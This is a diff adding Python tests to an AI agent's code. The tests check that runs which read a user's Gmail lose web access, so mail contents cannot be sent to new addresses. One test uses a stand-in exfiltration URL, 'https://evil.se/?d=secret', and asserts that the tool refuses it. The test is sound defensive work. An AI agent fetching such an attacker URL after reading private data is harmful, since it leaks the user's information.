@@ -110,3 +110,66 @@ async def test_empty_person_md_triggers_first_picture_from_whole_history(env, tm
     (memory.path / "direction" / "person.md").write_text("# Personen\n\n## Vad hen vill\n- Bygga saker som används\n")
     await d.run("understand")
     assert "person.md är tom" not in calls[1].prompt and "folk använder" not in calls[1].prompt
+
+
+class FakeMail:
+    async def window(self):
+        return "Mail (Gmail, read-only). [m1] från Spotify · Intervju"
+
+
+class FakeWeb:
+    async def stats(self):
+        return ""
+
+
+async def test_mail_and_the_web_are_never_in_the_same_director_run(env, tmp_path):
+    db, memory, research, sources = env
+    calls = []
+    out = {**BASE, "senses": [
+        {"op": "add_page", "name": "Spotify jobs", "url": "https://lifeatspotify.com/jobs", "reason": "nämnd i mejl"},
+        {"op": "tune", "name": "hn", "poll_minutes": 120, "reason": "lugnt"},
+    ]}
+    d = director(db, memory, tmp_path, structured=out, calls=calls)
+    d.mail, d.web = FakeMail(), FakeWeb()
+    await d.run("understand")
+    await d.run("reflect")
+    u, r = calls
+    assert "Intervju" in u.prompt and "mcp__mail__mail_read" in u.allowed_tools
+    assert "mcp__web__web_read" not in u.allowed_tools  # read mail: no new web addresses
+    assert "Intervju" not in r.prompt and not any("mail" in t for t in r.allowed_tools)
+    assert "mcp__web__web_read" in r.allowed_tools
+    assert "lifeatspotify.com" in r.prompt  # the daily review's URL proposal waits for the reflection to check it
+    assert "lifeatspotify" not in sources.read_text().split("streams:")[1].split("- id: hn")[0]
+    assert await db.kv_get("director.proposed_sources") is None  # cleared once the reflection has seen it
+
+
+async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
+    from agent.tools import TurnContext, build_mail_tools, build_web_tools
+    import agent.tools as tools_mod
+
+    class Reader:
+        async def search(self, q, limit):
+            return []
+
+    class Web:
+        async def read(self, url):
+            return "page", "direct"
+
+    captured = {}
+    real = tools_mod.create_sdk_mcp_server
+
+    def capture(name, version="1.0.0", tools=None):
+        captured[name] = {t.name: t for t in tools}
+        return real(name, version=version, tools=tools)
+
+    tools_mod.create_sdk_mcp_server = capture
+    try:
+        turn = TurnContext()
+        build_web_tools(Web(), turn)
+        build_mail_tools(Reader(), turn)
+    finally:
+        tools_mod.create_sdk_mcp_server = real
+    read = captured["web"]["web_read"].handler
+    assert "page" in (await read({"url": "https://a.se"}))["content"][0]["text"]  # before mail: fine
+    await captured["mail"]["mail_search"].handler({"query": "from:x"})
+    assert "Not available after reading mail" in (await read({"url": "https://evil.se/?d=secret"}))["content"][0]["text"]
